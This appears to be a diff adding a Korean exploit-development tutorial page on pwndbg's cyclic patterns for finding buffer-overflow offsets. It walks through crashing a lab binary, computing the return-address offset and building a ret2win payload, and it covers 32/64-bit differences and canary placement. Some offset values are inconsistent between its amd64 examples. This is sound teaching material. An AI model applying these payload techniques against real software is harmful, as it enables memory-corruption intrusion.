@@ -1,0 +1,168 @@
+<div class="page-header">
+  <div class="chapter-label">Chapter 06 · Part 3 — 익스플로잇 개발</div>
+  <h2>cyclic & 오프셋 계산</h2>
+  <p class="subtitle">버퍼 오버플로의 핵심 — 리턴 주소까지의 거리를 정확히 계산한다</p>
+</div>
+
+<div class="callout info">
+  <span class="callout-icon">📌</span>
+  <div class="callout-body">
+    <strong>이 챕터에서 배울 것</strong>
+    <p>De Bruijn 패턴 원리, cyclic 생성·검색, 크래시 직후 오프셋 계산, 32/64비트 차이, 파일로 저장하기, 실전 BOF 분석 워크플로우.</p>
+  </div>
+</div>
+
+<h3>왜 cyclic 패턴인가 — AAAA로는 안 되는 이유</h3>
+
+<p>
+  버퍼 오버플로를 확인하려고 <code>"A" * 200</code>을 넣으면 크래시는 나지만, 리턴 주소가 <code>0x41414141</code>로 덮여서 "오버플로는 됐는데 몇 바이트 떨어져 있지?"를 알 수 없다. 200바이트 중 어디서부터 리턴 주소가 시작됐는지 특정이 안 된다.
+</p>
+
+<p>
+  De Bruijn 패턴(cyclic)은 <strong>어떤 연속된 4(또는 8)바이트를 보더라도 패턴 안에서 딱 한 군데만 나타나는</strong> 문자열이다. 크래시 직후 리턴 주소에 남은 값을 보면 "이 4바이트는 패턴의 N번째 위치에 있다"를 즉시 계산할 수 있다.
+</p>
+
+<h3>cyclic 명령어 사용법</h3>
+
+<pre><code><span class="cm"># 패턴 생성</span>
+pwndbg> cyclic 100       <span class="cm"># 100바이트 패턴 생성</span>
+<span class="cm"># aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama...</span>
+
+pwndbg> cyclic 200       <span class="cm"># 200바이트</span>
+
+<span class="cm"># 패턴을 파일로 저장 (2024.02+ 기능)</span>
+pwndbg> cyclic 200 > /tmp/payload.txt
+pwndbg> run &lt; /tmp/payload.txt
+
+<span class="cm"># 오프셋 찾기 — 크래시 후 RIP/RSP 값으로</span>
+pwndbg> cyclic -l 0x6161616a        <span class="cm"># 이 4바이트가 몇 번째인지</span>
+pwndbg> cyclic -l jaaa              <span class="cm"># ASCII로도 가능</span>
+<span class="cm"># 출력: 36  → 오프셋 = 36바이트</span>
+
+<span class="cm"># 64비트 환경 — 8바이트씩 검색</span>
+pwndbg> cyclic -n 8 200             <span class="cm"># 8바이트 단위 패턴 생성</span>
+pwndbg> cyclic -n 8 -l 0x6161616a6161616b  <span class="cm"># 8바이트 오프셋 검색</span></code></pre>
+
+<h3>실전 BOF 분석 — 전체 워크플로우</h3>
+
+<ul class="step-list">
+  <li>
+    <div class="step-num">1</div>
+    <div>
+      <strong>바이너리 로드 & 보호 기법 확인</strong>
+      <pre><code>gdb ./vuln
+pwndbg> checksec
+<span class="cm"># Arch: amd64-64-little</span>
+<span class="cm"># RELRO: Partial</span>
+<span class="cm"># Stack: No canary found  ← 카나리 없음!</span>
+<span class="cm"># NX: NX enabled</span>
+<span class="cm"># PIE: No PIE</span></code></pre>
+    </div>
+  </li>
+  <li>
+    <div class="step-num">2</div>
+    <div>
+      <strong>cyclic 패턴으로 크래시 유발</strong>
+      <pre><code>pwndbg> cyclic 200
+pwndbg> run
+<span class="cm"># 프로그램이 입력 받을 때 패턴 붙여넣기</span>
+<span class="cm"># Program received signal SIGSEGV (fault addr 0x6161616a)</span></code></pre>
+    </div>
+  </li>
+  <li>
+    <div class="step-num">3</div>
+    <div>
+      <strong>크래시 주소로 오프셋 계산</strong>
+      <pre><code>pwndbg> p $rsp          <span class="cm"># 크래시 시 RSP 확인</span>
+pwndbg> x/gx $rsp       <span class="cm"># RSP가 가리키는 곳 (= 리턴 주소 위치)</span>
+<span class="cm"># 0x7fff...  0x000000006161616a</span>
+
+pwndbg> cyclic -l 0x6161616a
+<span class="cm"># 36</span>
+<span class="cm"># → 버퍼 시작에서 36바이트 = 리턴 주소 시작</span></code></pre>
+    </div>
+  </li>
+  <li>
+    <div class="step-num">4</div>
+    <div>
+      <strong>리턴 주소 확인 & 목표 설정</strong>
+      <pre><code><span class="cm"># win() 함수 주소 확인</span>
+pwndbg> p win
+<span class="cm"># $1 = {&lt;text variable, no debug info&gt;} 0x4011a3 &lt;win&gt;</span>
+
+<span class="cm"># 페이로드: 36바이트 패딩 + win() 주소</span>
+<span class="cm"># python3 -c "import sys; sys.stdout.buffer.write(b'A'*36 + b'\xa3\x11\x40\x00\x00\x00\x00\x00')"</span></code></pre>
+    </div>
+  </li>
+  <li>
+    <div class="step-num">5</div>
+    <div>
+      <strong>페이로드 검증</strong>
+      <pre><code>pwndbg> break *0x4011a3     <span class="cm"># win() 시작에 BP</span>
+pwndbg> run &lt; payload.bin
+<span class="cm"># Breakpoint hit at win()!</span></code></pre>
+    </div>
+  </li>
+</ul>
+
+<h3>32비트 vs 64비트 — 오프셋 계산 차이</h3>
+
+<div class="tabs">
+  <div class="tab-header">
+    <button class="tab-btn active" data-tab="x86">32비트 (x86)</button>
+    <button class="tab-btn" data-tab="x64">64비트 (x64)</button>
+  </div>
+  <div class="tab-panel active" data-panel="x86">
+    <pre><code><span class="cm"># 32비트: RIP 대신 EIP, 4바이트 단위</span>
+pwndbg> cyclic 150
+<span class="cm"># 크래시 후: EIP = 0x6161616a</span>
+
+pwndbg> cyclic -l 0x6161616a     <span class="cm"># -n 옵션 없으면 기본 4바이트</span>
+<span class="cm"># 36</span>
+
+<span class="cm"># 또는 EIP 직접 확인</span>
+pwndbg> p $eip
+<span class="cm"># $1 = (void (*)()) 0x6161616a</span>
+pwndbg> cyclic -l $eip</code></pre>
+  </div>
+  <div class="tab-panel" data-panel="x64">
+    <pre><code><span class="cm"># 64비트: RIP은 직접 덮기 어려움 (canonical 주소 제한)</span>
+<span class="cm"># 크래시 시 fault addr은 RSP의 값을 보는 게 더 정확</span>
+
+pwndbg> cyclic -n 8 200          <span class="cm"># 8바이트 단위 패턴</span>
+<span class="cm"># 크래시 후 RSP에 남은 값으로</span>
+pwndbg> x/gx $rsp                <span class="cm"># RSP 역참조</span>
+<span class="cm"># 0x7fff... 0x6161616a61616169</span>
+
+pwndbg> cyclic -n 8 -l 0x6161616a61616169
+<span class="cm"># 72 → 리턴 주소 오프셋</span>
+
+<span class="cm"># 주의: 64비트 주소는 상위 2바이트가 0x0000이어야 함</span>
+<span class="cm"># 0xdeadbeefcafebabe 같은 주소는 SIGSEGV 전에 이미 걸림</span></code></pre>
+  </div>
+</div>
+
+<h3>cyclic 응용 — 스택 카나리 위치 찾기</h3>
+
+<pre><code><span class="cm"># 스택 카나리가 있을 때 (Stack: Canary found)</span>
+<span class="cm"># 카나리는 로컬 변수 뒤, 리턴 주소 앞에 위치</span>
+<span class="cm"># 카나리를 덮으면 __stack_chk_fail()이 호출되며 종료</span>
+
+<span class="cm"># 카나리 값 확인 방법</span>
+pwndbg> p *(long*)($rbp - 8)    <span class="cm"># 카나리는 보통 RBP-8</span>
+<span class="cm"># $1 = 0x7d3a8e49c98f7e00    ← 하위 바이트가 항상 \x00</span>
+
+<span class="cm"># 카나리 위치 매핑</span>
+<span class="cm"># [버퍼] ... [카나리 8B] [old RBP 8B] [리턴주소 8B]</span>
+<span class="cm"># cyclic로 카나리 앞까지 오프셋 확인 후</span>
+<span class="cm"># 카나리는 유지, 리턴 주소만 덮기</span></code></pre>
+
+<div class="callout warn">
+  <span class="callout-icon">⚠️</span>
+  <div class="callout-body">
+    <strong>ASLR과 PIE에서 오프셋의 의미</strong>
+    <p>
+      pwndbg는 기본적으로 ASLR을 끈다(<code>disable-randomization on</code>). 실제 원격 서버에서는 ASLR이 켜져 있으므로 매번 주소가 달라진다. 로컬에서 찾은 오프셋(리턴 주소까지 거리)은 변하지 않지만, 덮어쓸 목표 주소는 libc 릭이나 PIE 릭 등으로 런타임에 계산해야 한다.
+    </p>
+  </div>
+</div>
